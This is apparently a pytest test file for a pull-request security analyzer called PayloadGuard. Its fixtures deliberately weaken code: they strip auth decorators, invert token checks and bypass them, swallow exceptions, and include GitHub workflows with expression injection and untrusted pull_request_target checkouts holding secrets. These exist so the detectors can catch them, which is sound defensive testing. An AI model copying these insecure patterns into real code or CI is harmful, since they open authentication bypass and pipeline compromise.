    def test_d06_guard_decorator_and_rollback_call_removal(self):
        """D06: Removing @require_auth decorator or self._rollback() call from surviving method triggers BLOCK."""
        base_db = (
            "class Database:\n"
            "    @require_auth\n"
            "    def transaction(self, query: str):\n"
            "        try:\n"
            "            return self.execute(query)\n"
            "        except Exception:\n"
            "            self._rollback()\n"
            "            raise\n"
        )
        head_db = (
            "class Database:\n"
            "    def transaction(self, query: str):\n"
            "        try:\n"
            "            return self.execute(query)\n"
            "        except Exception:\n"
            "            raise\n"
        )
        engine = ConsequenceEngine(mode="enforce")
        rep = engine.analyze_deltas([
            FileDeltaInput("database.py", change_type="M", base_source=base_db, head_source=head_db)
        ])
        assert rep.recommended_verdict == "DESTRUCTIVE"
        d06 = [f for f in rep.findings if f.detector_id == DETECTOR_D06_GUARD]
        assert len(d06) == 1
        assert d06[0].consequence_class == "SECURITY_GUARD_REMOVED"
        assert d06[0].tier == TIER_VERIFIED
        assert d06[0].policy_recommendation == POLICY_BLOCK
        ev_kinds = {e.kind for e in d06[0].evidence}
        assert "GUARD_DECORATOR_REMOVED" in ev_kinds
        assert "GUARD_CALL_REMOVED" in ev_kinds


# ==============================================================================
# 5. END-TO-END GIT REPOSITORY & POLICY MODE INTEGRATION TESTS (TASK 6)
# ==============================================================================

class TestPayloadAnalyzerIntegration:
    def test_enforce_mode_suppresses_legacy_l4_false_positive_on_massive_rename(self, tmp_path):
        """
        When 4 of 4 classes (100% > 20% L4 threshold) are renamed with intact methods:
        - Legacy shadow mode flags DESTRUCTIVE due to flat-name L4 deletion ratio.
        - Enforce mode proves via 5-stage SCG matching that 0 symbols were removed
          and suppresses the false-positive L4 CRITICAL flag -> SAFE!
        """
        import git
        from analyze import PayloadAnalyzer, PayloadGuardConfig

        repo = git.Repo.init(tmp_path)
        repo.config_writer().set_value("user", "name", "Test").release()
        repo.config_writer().set_value("user", "email", "test@example.com").release()

        base_code = (
            "class Alpha:\n"
            "    def run_alpha(self, x: int) -> int:\n"
            "        return x + 1\n\n"
            "class Beta:\n"
            "    def run_beta(self, x: int) -> int:\n"
            "        return x + 2\n\n"
            "class Gamma:\n"
            "    def run_gamma(self, x: int) -> int:\n"
            "        return x + 3\n\n"
            "class Delta:\n"
            "    def run_delta(self, x: int) -> int:\n"
            "        return x + 4\n"
        )
        head_code = (
            "class AlphaV2:\n"
            "    def run_alpha(self, x: int) -> int:\n"
            "        return x + 1\n\n"
            "class BetaV2:\n"
            "    def run_beta(self, x: int) -> int:\n"
            "        return x + 2\n\n"
            "class GammaV2:\n"
            "    def run_gamma(self, x: int) -> int:\n"
            "        return x + 3\n\n"
            "class DeltaV2:\n"
            "    def run_delta(self, x: int) -> int:\n"
            "        return x + 4\n"
        )
        f = tmp_path / "service.py"
        f.write_text(base_code, encoding="utf-8")
        repo.index.add(["service.py"])
        repo.index.commit("initial base")
        repo.create_head("main")

        repo.create_head("feature-rename").checkout()
        f.write_text(head_code, encoding="utf-8")
        repo.index.add(["service.py"])
        repo.index.commit("rename classes to V2")

        # Shadow mode preserves legacy L4 verdict (DESTRUCTIVE because 4/8 flat names 'disappeared')
        cfg_shadow = PayloadGuardConfig()
        cfg_shadow.consequence["mode"] = "shadow"
        rep_shadow = PayloadAnalyzer(str(tmp_path), "feature-rename", "main", config=cfg_shadow).analyze(
            pr_description="Refactor class names to V2 across service.py"
        )
        assert rep_shadow["verdict"]["status"] == "DESTRUCTIVE"
        assert rep_shadow["consequence_analysis"]["recommended_verdict"] == "SAFE"

        # Enforce mode uses SCG 5-stage matching to prove 0 unmatched removals -> SAFE
        cfg_enforce = PayloadGuardConfig()
        cfg_enforce.consequence["mode"] = "enforce"
        rep_enforce = PayloadAnalyzer(str(tmp_path), "feature-rename", "main", config=cfg_enforce).analyze(
            pr_description="Refactor class names to V2 across service.py"
        )
        assert rep_enforce["verdict"]["status"] == "SAFE"

    def test_unsupported_source_change_reported_without_changing_verdict(self, tmp_path):
        """AUDIT_LOG §V4: analyze() surfaces D01 UNSUPPORTED_EXTENSION in the report and the
        PR comment, and the WARN finding leaves the enforce-mode verdict at SAFE."""
        import git
        from analyze import PayloadAnalyzer, PayloadGuardConfig, format_markdown_report

        repo = git.Repo.init(tmp_path)
        repo.config_writer().set_value("user", "name", "Test").release()
        repo.config_writer().set_value("user", "email", "test@example.com").release()
        rb = tmp_path / "lib" / "auth.rb"
        rb.parent.mkdir()
        rb.write_text("def verify(t)\n  return false if t.nil?\n  check(t)\nend\n", encoding="utf-8")
        repo.index.add(["lib/auth.rb"])
        repo.index.commit("initial base")
        repo.create_head("main")

        repo.create_head("feature-rb").checkout()
        rb.write_text("def verify(t)\n  true\nend\n", encoding="utf-8")
        repo.index.add(["lib/auth.rb"])
        repo.index.commit("Simplify verify helper")

        cfg = PayloadGuardConfig()
        cfg.consequence["mode"] = "enforce"
        rep = PayloadAnalyzer(str(tmp_path), "feature-rb", "main", config=cfg).analyze(
            pr_description="Simplify verify helper in lib/auth.rb"
        )
        ca = rep["consequence_analysis"]
        d01 = [f for f in ca["findings"] if f["detector_id"] == DETECTOR_D01_PARSER]
        assert [f["affected_files"] for f in d01] == [["lib/auth.rb"]]
        assert d01[0]["policy_recommendation"] == POLICY_WARN
        assert ca["parser_completeness"]["complete"] is False
        assert rep["verdict"]["status"] == "SAFE"
        assert "UNSUPPORTED_EXTENSION" in format_markdown_report(rep)

    def test_shadow_advisory_and_enforce_modes_on_threshold_gaming_repo(self, tmp_path):
        """
        Verify shadow (legacy SAFE), advisory (upgrades to REVIEW), and enforce
        (upgrades to DESTRUCTIVE) on a sub-threshold capability deletion with broken callers.
        """
        import git
        from analyze import PayloadAnalyzer, PayloadGuardConfig, format_markdown_report

        repo = git.Repo.init(tmp_path)
        repo.config_writer().set_value("user", "name", "Test").release()
        repo.config_writer().set_value("user", "email", "test@example.com").release()

        # 20 functions in base so deleting 3 is 3/20 = 15% (< 20% L4 threshold)
        funcs_keep = "\n".join(
            f"def helper_{i}(x: int) -> int:\n    return x + {i}\n"
            for i in range(1, 18)
        )
        sec_funcs = (
            "def revoke_all_tokens(user_id: str) -> int:\n"
            "    cleaned = user_id.strip()\n"
            "    return len(cleaned)\n\n"
            "def deactivate_account(user_id: str) -> bool:\n"
            "    cleaned = user_id.strip()\n"
            "    return bool(cleaned)\n\n"
            "def verify_admin_signature(sig: str) -> bool:\n"
            "    cleaned = sig.strip()\n"
            "    return len(cleaned) == 64\n"
        )
        caller_code = (
            "from auth_mod import revoke_all_tokens, deactivate_account\n\n"
            "def test_security_flows():\n"
            "    revoke_all_tokens('alice')\n"
            "    deactivate_account('alice')\n"
        )
        (tmp_path / "auth_mod.py").write_text(funcs_keep + "\n" + sec_funcs, encoding="utf-8")
        (tmp_path / "test_security.py").write_text(caller_code, encoding="utf-8")
        repo.index.add(["auth_mod.py", "test_security.py"])
        repo.index.commit("initial commit")
        repo.create_head("main")

        repo.create_head("evasion-branch").checkout()
        padding = "\n".join(f"# documentation line {i}" for i in range(40))
        trivial_getters = (
            "def get_count_a() -> int:\n    return 0\n"
            "def get_count_b() -> int:\n    return 0\n"
        )
        (tmp_path / "auth_mod.py").write_text(funcs_keep + "\n" + trivial_getters + "\n" + padding, encoding="utf-8")
        repo.index.add(["auth_mod.py"])
        repo.index.commit("update helpers")

        # 1. Shadow mode -> SAFE
        cfg_s = PayloadGuardConfig()
        cfg_s.consequence["mode"] = "shadow"
        rep_s = PayloadAnalyzer(str(tmp_path), "evasion-branch", "main", config=cfg_s).analyze(
            pr_description="Update helper functions and documentation in auth_mod.py"
        )
        assert rep_s["verdict"]["status"] == "SAFE"
        assert rep_s["consequence_analysis"]["recommended_verdict"] == "DESTRUCTIVE"

        # 2. Advisory mode -> REVIEW
        cfg_a = PayloadGuardConfig()
        cfg_a.consequence["mode"] = "advisory"
        rep_a = PayloadAnalyzer(str(tmp_path), "evasion-branch", "main", config=cfg_a).analyze(
            pr_description="Update helper functions and documentation in auth_mod.py"
        )
        assert rep_a["verdict"]["status"] == "REVIEW"

        # 3. Enforce mode -> DESTRUCTIVE
        cfg_e = PayloadGuardConfig()
        cfg_e.consequence["mode"] = "enforce"
        rep_e = PayloadAnalyzer(str(tmp_path), "evasion-branch", "main", config=cfg_e).analyze(
            pr_description="Update helper functions and documentation in auth_mod.py"
        )
        assert rep_e["verdict"]["status"] == "DESTRUCTIVE"
        md = format_markdown_report(rep_e)
        assert "Consequence Analysis (`consequence.v1`)" in md
        assert "D03_COMPOUND_LOSS" in md
        assert "D04_PUBLIC_API_BREAK" in md
        assert "<details><summary>Evidence & Remediation</summary>" in md


# ==============================================================================
# 6. D06 v2 (GUARD POLARITY / BYPASS / EXCEPTION) & D04 v2 (IMPORT ALIAS / CONSOLIDATION) & USABILITY
# ==============================================================================

class TestDetectorAccuracyV2AndUsability:
    def test_d06_v2_guard_polarity_inversion_python_and_typescript(self):
        """D06 v2: Inverting `if not verify_token(t): raise` -> `if verify_token(t): raise` triggers BLOCK even though call set is unchanged."""
        base_py = (
            "def authorize_request(token: str) -> bool:\n"
            "    if not verify_token(token):\n"
            "        raise PermissionError('invalid token')\n"
            "    return True\n"
        )
        head_py_inverted = (
            "def authorize_request(token: str) -> bool:\n"
            "    if verify_token(token):\n"
            "        raise PermissionError('invalid token')\n"
            "    return True\n"
        )
        head_py_benign = (
            "def authorize_request(token: str) -> bool:\n"
            "    if not verify_token(token):\n"
            "        logger.warning('bad token')\n"
            "        raise PermissionError('invalid token')\n"
            "    return True\n"
        )
        engine = ConsequenceEngine(mode="enforce")
        rep = engine.analyze_deltas([
            FileDeltaInput("auth.py", change_type="M", base_source=base_py, head_source=head_py_inverted)
        ])
        assert rep.recommended_verdict == "DESTRUCTIVE"
        d06 = [f for f in rep.findings if f.detector_id == DETECTOR_D06_GUARD]
        assert len(d06) == 1
        assert d06[0].consequence_class == "SECURITY_GUARD_WEAKENED"
        assert d06[0].policy_recommendation == POLICY_BLOCK
        assert any(e.kind == "GUARD_POLARITY_INVERTED" for e in d06[0].evidence)

        # Benign logging addition alongside raise must stay SAFE
        rep_safe = engine.analyze_deltas([
            FileDeltaInput("auth.py", change_type="M", base_source=base_py, head_source=head_py_benign)
        ])
        assert rep_safe.recommended_verdict == "SAFE"
        assert [f for f in rep_safe.findings if f.detector_id == DETECTOR_D06_GUARD] == []

        # TypeScript guard polarity inversion
        base_ts = (
            "export function checkAccess(token: string): boolean {\n"
            "    if (!verifyToken(token)) {\n"
            "        throw new Error('Unauthorized');\n"
            "    }\n"
            "    return true;\n"
            "}\n"
        )
        head_ts = (
            "export function checkAccess(token: string): boolean {\n"
            "    if (verifyToken(token)) {\n"
            "        throw new Error('Unauthorized');\n"
            "    }\n"
            "    return true;\n"
            "}\n"
        )
        rep_ts = engine.analyze_deltas([
            FileDeltaInput("auth.ts", change_type="M", base_source=base_ts, head_source=head_ts)
        ])
        assert rep_ts.recommended_verdict == "DESTRUCTIVE"
        d06_ts = [f for f in rep_ts.findings if f.detector_id == DETECTOR_D06_GUARD]
        assert len(d06_ts) == 1
        assert any(e.kind == "GUARD_POLARITY_INVERTED" for e in d06_ts[0].evidence)

    def test_d06_v2_guard_enforcement_neutralized_and_early_return_bypass(self):
        """D06 v2: Neutralizing failure branch (`raise` -> `pass`) or inserting `return True` before guard triggers BLOCK."""
        base_py = (
            "def check_permission(user: str) -> bool:\n"
            "    if not validate_hmac(user):\n"
            "        raise ValueError('bad hmac')\n"
            "    return True\n"
        )
        head_neutralized = (
            "def check_permission(user: str) -> bool:\n"
            "    if not validate_hmac(user):\n"
            "        logger.info('ignoring hmac mismatch')\n"
            "    return True\n"
        )
        head_early_return = (
            "def check_permission(user: str) -> bool:\n"
            "    return True\n"
            "    if not validate_hmac(user):\n"
            "        raise ValueError('bad hmac')\n"
            "    return True\n"
        )
        engine = ConsequenceEngine(mode="enforce")

        rep1 = engine.analyze_deltas([
            FileDeltaInput("perm.py", change_type="M", base_source=base_py, head_source=head_neutralized)
        ])
        assert rep1.recommended_verdict == "DESTRUCTIVE"
        d06_1 = [f for f in rep1.findings if f.detector_id == DETECTOR_D06_GUARD]
        assert len(d06_1) == 1
        assert any(e.kind == "GUARD_ENFORCEMENT_NEUTRALIZED" for e in d06_1[0].evidence)

        rep2 = engine.analyze_deltas([
            FileDeltaInput("perm.py", change_type="M", base_source=base_py, head_source=head_early_return)
        ])
        assert rep2.recommended_verdict == "DESTRUCTIVE"
        d06_2 = [f for f in rep2.findings if f.detector_id == DETECTOR_D06_GUARD]
        assert len(d06_2) == 1
        assert any(e.kind == "GUARD_BYPASSED_BY_EARLY_RETURN" for e in d06_2[0].evidence)

    def test_d06_v2_exception_handler_swallowed(self):
        """D06 v2: Weakening `except Exception: raise` to `except Exception: pass` or `return True` triggers BLOCK."""
        base_py = (
            "def verify_jwt_signature(token: str) -> bool:\n"
            "    try:\n"
            "        decode_token(token)\n"
            "        return True\n"
            "    except Exception:\n"
            "        raise\n"
        )
        head_swallowed = (
            "def verify_jwt_signature(token: str) -> bool:\n"
            "    try:\n"
            "        decode_token(token)\n"
            "        return True\n"
            "    except Exception:\n"
            "        return True\n"
        )
        engine = ConsequenceEngine(mode="enforce")
        rep = engine.analyze_deltas([
            FileDeltaInput("jwt_auth.py", change_type="M", base_source=base_py, head_source=head_swallowed)
        ])
        assert rep.recommended_verdict == "DESTRUCTIVE"
        d06 = [f for f in rep.findings if f.detector_id == DETECTOR_D06_GUARD]
        assert len(d06) == 1
        assert any(e.kind == "EXCEPTION_HANDLER_SWALLOWED" for e in d06[0].evidence)

    def test_d04_v2_import_alias_and_cross_module_disambiguation(self):
        """D04 v2: Aliased imports (`from auth import deactivate as disable_user`) and module-qualified calls resolve to removed symbol."""
        base_auth = (
            "def login(u: str) -> bool:\n"
            "    return bool(u)\n\n"
            "def deactivate(u: str) -> bool:\n"
            "    return True\n"
        )
        head_auth = (
            "def login(u: str) -> bool:\n"
            "    return bool(u)\n"
        )
        # Another module in head STILL defines a function named `deactivate`, AND caller uses an import alias!
        repo_head = {
            "other_service.py": "def deactivate(x: str) -> bool:\n    return False\n",
            "admin_routes.py": (
                "from auth import deactivate as disable_user\n\n"
                "def kick_user(u: str):\n"
                "    return disable_user(u)\n"
            ),
        }
        engine = ConsequenceEngine(mode="enforce")
        rep = engine.analyze_deltas(
            [FileDeltaInput("auth.py", change_type="M", base_source=base_auth, head_source=head_auth)],
            repo_head_files=repo_head,
        )
        assert rep.recommended_verdict == "DESTRUCTIVE"
        d04 = [f for f in rep.findings if f.detector_id == DETECTOR_D04_API and f.consequence_class == "UNRESOLVED_CALLER"]
        assert len(d04) == 1
        assert "deactivate" in d04[0].affected_symbols
        assert any(e.file == "admin_routes.py" and e.kind == "UNRESOLVED_CALL_SITE" for e in d04[0].evidence)

    def test_d04_v2_container_consolidation_reduces_finding_noise(self):
        """D04 v2: Deleting a multi-method class consolidates UNRESOLVED_CALLER by class and PUBLIC_API_REMOVAL by file."""
        base_cls = (
            "class BillingClient:\n"
            "    def charge(self, amt: int) -> bool:\n        return amt > 0\n"
            "    def refund(self, tx: str) -> bool:\n        return bool(tx)\n"
            "    def invoice(self, tx: str) -> str:\n        return tx\n"
            "    def cancel(self, sub: str) -> bool:\n        return bool(sub)\n"
        )
        repo_head = {
            "checkout.py": (
                "def run_checkout(client):\n"
                "    billingclient = BillingClient()\n"
                "    billingclient.charge(100)\n"
                "    billingclient.refund('tx_1')\n"
            )
        }
        engine = ConsequenceEngine(mode="enforce")
        rep = engine.analyze_deltas(
            [FileDeltaInput("billing.py", change_type="D", base_source=base_cls, head_source=None)],
            repo_head_files=repo_head,
        )
        caller_findings = [f for f in rep.findings if f.consequence_class == "UNRESOLVED_CALLER"]
        api_findings = [f for f in rep.findings if f.consequence_class == "PUBLIC_API_REMOVAL"]
        # Consolidated to 1 container caller finding and 1 file API removal finding
        assert len(caller_findings) == 1
        assert len(api_findings) == 1
        assert set(caller_findings[0].affected_symbols) == {
            "BillingClient",
            "BillingClient.charge",
            "BillingClient.refund",
        }

    def test_usability_cli_print_and_sarif_report(self, capsys):
        """Verify print_report renders CONSEQUENCE ANALYSIS and format_sarif_report emits valid SARIF 2.1.0."""
        from analyze import print_report, format_sarif_report

        engine = ConsequenceEngine(mode="enforce")
        c_rep = engine.analyze_deltas(
            [
                FileDeltaInput(
                    "auth.py",
                    change_type="M",
                    base_source="def verify(t: str) -> bool:\n    return bool(t)\n",
                    head_source="",
                )
            ],
            repo_head_files={"app.py": "def main():\n    verify('tok')\n"},
        )
        fake_full_report = {
            "timestamp": "2026-10-23T18:00:00Z",
            "analysis": {"branch": "feat/test", "target": "main", "repo_path": "."},
            "temporal": {
                "branch_age_days": 1,
                "branch_last_commit": "2026-10-23T18:00:00Z",
                "target_last_commit": "2026-10-22T18:00:00Z",
                "branch_commit_hash": "aaaa1111",
                "target_commit_hash": "bbbb2222",
            },
            "files": {"added": 0, "deleted": 0, "modified": 1, "total_changed": 1},
            "lines": {"added": 0, "deleted": 2, "net_change": -2, "deletion_ratio_percent": 100.0},
            "deleted_files": {"total": 0, "critical": [], "all": []},
            "verdict": {
                "status": "DESTRUCTIVE",
                "severity": "CRITICAL",
                "score": 8,
                "flags": ["CONSEQUENCE BLOCK [D04_PUBLIC_API_BREAK]: Removed function 'verify'"],
                "recommendation": "DO NOT MERGE",
            },
            "consequence_analysis": c_rep.to_dict(),
        }
        print_report(fake_full_report)
        captured = capsys.readouterr().out
        assert "CONSEQUENCE ANALYSIS (consequence.v1)" in captured
        assert "D04_PUBLIC_API_BREAK (UNRESOLVED_CALLER)" in captured
        assert "Evidence (app.py:2):" in captured
        assert "Fix:" in captured

        sarif = format_sarif_report(fake_full_report)
        assert sarif["version"] == "2.1.0"
        assert len(sarif["runs"]) == 1
        run = sarif["runs"][0]
        assert run["tool"]["driver"]["name"] == "PayloadGuard"
        assert len(run["results"]) >= 1
        res0 = run["results"][0]
        assert res0["ruleId"] == "D04_PUBLIC_API_BREAK"
        assert res0["level"] == "error"
        locs = res0["locations"]
        assert any(
            loc["physicalLocation"]["artifactLocation"]["uri"] == "app.py"
            and loc["physicalLocation"]["region"]["startLine"] == 2
            for loc in locs
        )

    def test_d06_compound_boolop_guard_and_polyglot_state_guards(self):
        """
        Verify mutation-discovered edge cases:
        1) Combining sequential `if` guards into an `or`-joined `if` preserves negated polarity (no FP).
        2) Removing JS `if (!response.ok) throw ...` or Go `if s.started { return fmt.Errorf(...) }`
           state-based abort guards fires D06_GUARD_REGRESSION (`GUARD_CLAUSE_REMOVED`).
        """
        engine = ConsequenceEngine(mode="enforce")

        # 1. Benign compound BoolOp guard refactor -> SAFE
        base_py = (
            "class Auth:\n"
            "    def login(self, user, password):\n"
            "        if not user or not user['active']:\n"
            "            return None\n"
            "        if not self.validator.verify(password):\n"
            "            return None\n"
            "        return 'tok'\n"
        )
        head_py = (
            "class Auth:\n"
            "    def login(self, user, password):\n"
            "        if not user or not user['active'] or not self.validator.verify(password):\n"
            "            return None\n"
            "        return 'tok'\n"
        )
        rep_py = engine.analyze_deltas([
            FileDeltaInput("auth.py", change_type="M", base_source=base_py, head_source=head_py)
        ])
        assert rep_py.recommended_verdict == "SAFE"
        assert [f for f in rep_py.findings if f.detector_id == DETECTOR_D06_GUARD] == []

        # 2. JS state-guard removal (`if (!response.ok) throw new Error(...)`) -> DESTRUCTIVE
        base_js = (
            "async function fetchUser(userId) {\n"
            "  const response = await fetch(`/users/${userId}`);\n"
            "  if (!response.ok) {\n"
            "    throw new Error('failed');\n"
            "  }\n"
            "  return response.json();\n"
            "}\n"
        )
        head_js = (
            "async function fetchUser(userId) {\n"
            "  const response = await fetch(`/users/${userId}`);\n"
            "  return response.json();\n"
            "}\n"
        )
        rep_js = engine.analyze_deltas([
            FileDeltaInput("api.js", change_type="M", base_source=base_js, head_source=head_js)
        ])
        assert rep_js.recommended_verdict == "DESTRUCTIVE"
        d06_js = [f for f in rep_js.findings if f.detector_id == DETECTOR_D06_GUARD]
        assert len(d06_js) == 1
        assert any(e.kind == "GUARD_CLAUSE_REMOVED" for e in d06_js[0].evidence)

        # 3. Go state-guard removal (`if s.started { return fmt.Errorf(...) }`) -> DESTRUCTIVE
        base_go = (
            "package main\n"
            "import \"fmt\"\n"
            "func (s *Server) Start() error {\n"
            "\tif s.started {\n"
            "\t\treturn fmt.Errorf(\"already started\")\n"
            "\t}\n"
            "\ts.started = true\n"
            "\treturn nil\n"
            "}\n"
        )
        head_go = (
            "package main\n"
            "func (s *Server) Start() error {\n"
            "\ts.started = true\n"
            "\treturn nil\n"
            "}\n"
        )
        rep_go = engine.analyze_deltas([
            FileDeltaInput("utils.go", change_type="M", base_source=base_go, head_source=head_go)
        ])
        assert rep_go.recommended_verdict == "DESTRUCTIVE"
        d06_go = [f for f in rep_go.findings if f.detector_id == DETECTOR_D06_GUARD]
        assert len(d06_go) == 1
        assert any(e.kind == "GUARD_CLAUSE_REMOVED" for e in d06_go[0].evidence)

    def test_d06_boolean_short_circuit_and_python_go_state_guards(self):
        """
        Verify D06 catches:
        1) Boolean short-circuit debugging leftovers (`if not verify_token(tok) and False:` / `&& false`).
        2) Python call-free state guard removal (`if not user.is_admin: raise PermissionError(...)`).
        3) Go idiomatic error-propagation guard removal (`if err != nil { return err }`).
        4) Benign replacement of state guard with call-based guard -> SAFE.
        """
        engine = ConsequenceEngine(mode="enforce")

        # 1a. Python boolean short-circuit bypass (`and False`) -> DESTRUCTIVE
        base_sc_py = (
            "def authorize_request(token: str) -> dict:\n"
            "    if not verify_token(token):\n"
            "        raise PermissionError('invalid token')\n"
            "    return {'ok': True}\n"
        )
        head_sc_py = (
            "def authorize_request(token: str) -> dict:\n"
            "    if not verify_token(token) and False:\n"
            "        raise PermissionError('invalid token')\n"
            "    return {'ok': True}\n"
        )
        rep_sc_py = engine.analyze_deltas([
            FileDeltaInput("auth.py", change_type="M", base_source=base_sc_py, head_source=head_sc_py)
        ])
        assert rep_sc_py.recommended_verdict == "DESTRUCTIVE"
        d06_sc_py = [f for f in rep_sc_py.findings if f.detector_id == DETECTOR_D06_GUARD]
        assert len(d06_sc_py) == 1
        assert any(e.kind == "GUARD_SHORT_CIRCUITED" for e in d06_sc_py[0].evidence)

        # 1b. TypeScript boolean short-circuit bypass (`&& false`) -> DESTRUCTIVE
        base_sc_ts = (
            "export function checkAccess(tok: string): boolean {\n"
            "  if (!verifyToken(tok)) {\n"
            "    throw new Error('denied');\n"
            "  }\n"
            "  return true;\n"
            "}\n"
        )
        head_sc_ts = (
            "export function checkAccess(tok: string): boolean {\n"
            "  if (!verifyToken(tok) && false) {\n"
            "    throw new Error('denied');\n"
            "  }\n"
            "  return true;\n"
            "}\n"
        )
        rep_sc_ts = engine.analyze_deltas([
            FileDeltaInput("auth.ts", change_type="M", base_source=base_sc_ts, head_source=head_sc_ts)
        ])
        assert rep_sc_ts.recommended_verdict == "DESTRUCTIVE"
        d06_sc_ts = [f for f in rep_sc_ts.findings if f.detector_id == DETECTOR_D06_GUARD]
        assert len(d06_sc_ts) == 1
        assert any(e.kind == "GUARD_SHORT_CIRCUITED" for e in d06_sc_ts[0].evidence)

        # 2. Python call-free state guard removal (`if not user.is_admin: raise PermissionError`) -> DESTRUCTIVE
        base_state_py = (
            "def delete_tenant(user, tenant_id: str) -> bool:\n"
            "    if not user.is_admin:\n"
            "        raise PermissionError('admin required')\n"
            "    return True\n"
        )
        head_state_py = (
            "def delete_tenant(user, tenant_id: str) -> bool:\n"
            "    return True\n"
        )
        rep_state_py = engine.analyze_deltas([
            FileDeltaInput("tenant.py", change_type="M", base_source=base_state_py, head_source=head_state_py)
        ])
        assert rep_state_py.recommended_verdict == "DESTRUCTIVE"
        d06_state_py = [f for f in rep_state_py.findings if f.detector_id == DETECTOR_D06_GUARD]
        assert len(d06_state_py) == 1
        assert any(e.kind == "GUARD_CLAUSE_REMOVED" for e in d06_state_py[0].evidence)

        # 3. Go error-check removal (`if err != nil { return err }`) -> DESTRUCTIVE
        base_err_go = (
            "package auth\n"
            "func ValidateHeader(raw string) error {\n"
            "\terr := parseHeader(raw)\n"
            "\tif err != nil {\n"
            "\t\treturn err\n"
            "\t}\n"
            "\treturn nil\n"
            "}\n"
        )
        head_err_go = (
            "package auth\n"
            "func ValidateHeader(raw string) error {\n"
            "\t_ = parseHeader(raw)\n"
            "\treturn nil\n"
            "}\n"
        )
        rep_err_go = engine.analyze_deltas([
            FileDeltaInput("header.go", change_type="M", base_source=base_err_go, head_source=head_err_go)
        ])
        assert rep_err_go.recommended_verdict == "DESTRUCTIVE"
        d06_err_go = [f for f in rep_err_go.findings if f.detector_id == DETECTOR_D06_GUARD]
        assert len(d06_err_go) == 1
        assert any(e.kind == "GUARD_CLAUSE_REMOVED" for e in d06_err_go[0].evidence)

        # 4. Benign replacement of state guard with call-based guard -> SAFE
        head_replaced_py = (
            "def delete_tenant(user, tenant_id: str) -> bool:\n"
            "    if not verify_admin(user):\n"
            "        raise PermissionError('admin required')\n"
            "    return True\n"
        )
        rep_replaced_py = engine.analyze_deltas([
            FileDeltaInput("tenant.py", change_type="M", base_source=base_state_py, head_source=head_replaced_py)
        ])
        assert rep_replaced_py.recommended_verdict == "SAFE"

    def test_d08_workflow_expression_injection_and_safe_env_binding(self):
        """
        Verify D08_WORKFLOW_INTEGRITY detects untrusted GitHub expression interpolation
        inside `run:` blocks while allowing safe `env:` variable binding and not
        re-alerting on unchanged legacy expressions.
        """
        engine = ConsequenceEngine(mode="enforce")

        base_wf = (
            "name: CI\n"
            "on: [pull_request]\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11\n"
            "      - name: Run pytest\n"
            "        run: pytest -q\n"
        )
        # 1. Vulnerable direct interpolation inside `run:` -> BLOCK / DESTRUCTIVE
        vuln_wf = (
            "name: CI\n"
            "on: [pull_request]\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11\n"
            "      - name: Announce PR\n"
            "        run: |\n"
            "          echo \"Title: ${{ github.event.pull_request.title }}\"\n"
            "          pytest -q\n"
        )
        rep_vuln = engine.analyze_deltas([
            FileDeltaInput(".github/workflows/ci.yml", change_type="M", base_source=base_wf, head_source=vuln_wf)
        ])
        assert rep_vuln.recommended_verdict == "DESTRUCTIVE"
        d08_vuln = [f for f in rep_vuln.findings if f.detector_id == DETECTOR_D08_WORKFLOW]
        assert len(d08_vuln) == 1
        assert d08_vuln[0].consequence_class == "UNTRUSTED_WORKFLOW_EXPRESSION_INJECTION"
        assert d08_vuln[0].policy_recommendation == POLICY_BLOCK

        # 2. Safe remediation via `env:` binding -> SAFE
        safe_wf = (
            "name: CI\n"
            "on: [pull_request]\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11\n"
            "      - name: Announce PR safely\n"
            "        env:\n"
            "          PR_TITLE: ${{ github.event.pull_request.title }}\n"
            "        run: |\n"
            "          echo \"Title: $PR_TITLE\"\n"
            "          pytest -q\n"
        )
        rep_safe = engine.analyze_deltas([
            FileDeltaInput(".github/workflows/ci.yml", change_type="M", base_source=base_wf, head_source=safe_wf)
        ])
        assert rep_safe.recommended_verdict == "SAFE"
        assert [f for f in rep_safe.findings if f.detector_id == DETECTOR_D08_WORKFLOW] == []

    def test_d08_prt_untrusted_checkout_and_action_pin_downgrade_and_ci_gate(self):
        """
        Verify D08 detects:
        1) `pull_request_target` + untrusted PR checkout (BLOCK with secrets/write, REVIEW without).
        2) Action 40-char SHA pin downgraded to mutable tag (`@v4`) -> REVIEW.
        3) Action 40-char SHA updated to another 40-char SHA -> SAFE.
        4) Adding `continue-on-error: true` to a step -> REVIEW (`CI_GATE_WEAKENED`).
        """
        engine = ConsequenceEngine(mode="enforce")

        # 1a. pull_request_target + untrusted checkout + secrets -> DESTRUCTIVE (POLICY_BLOCK)
        prt_priv_wf = (
            "name: PR Target Privileged\n"
            "on:\n"
            "  pull_request_target:\n"
            "    types: [opened, synchronize]\n"
            "permissions:\n"
            "  contents: write\n"
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "        with:\n"
            "          ref: ${{ github.event.pull_request.head.sha }}\n"
            "      - run: npm test\n"
            "        env:\n"
            "          TOKEN: ${{ secrets.NPM_TOKEN }}\n"
        )
        rep_prt_priv = engine.analyze_deltas([
            FileDeltaInput(".github/workflows/prt.yml", change_type="A", base_source="", head_source=prt_priv_wf)
        ])
        assert rep_prt_priv.recommended_verdict == "DESTRUCTIVE"
        d08_prt_priv = [f for f in rep_prt_priv.findings if f.consequence_class == "PULL_REQUEST_TARGET_UNTRUSTED_CHECKOUT"]
        assert len(d08_prt_priv) == 1
        assert d08_prt_priv[0].policy_recommendation == POLICY_BLOCK

        # 1b. pull_request_target + untrusted checkout without write/secrets -> REVIEW
        prt_ro_wf = (
            "name: PR Target ReadOnly\n"
            "on: [pull_request_target]\n"
            "jobs:\n"
            "  label:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "        with:\n"
            "          ref: ${{ github.event.pull_request.head.sha }}\n"
        )
        rep_prt_ro = engine.analyze_deltas([
            FileDeltaInput(".github/workflows/prt_ro.yml", change_type="A", base_source="", head_source=prt_ro_wf)
        ])
        assert rep_prt_ro.recommended_verdict == "REVIEW"
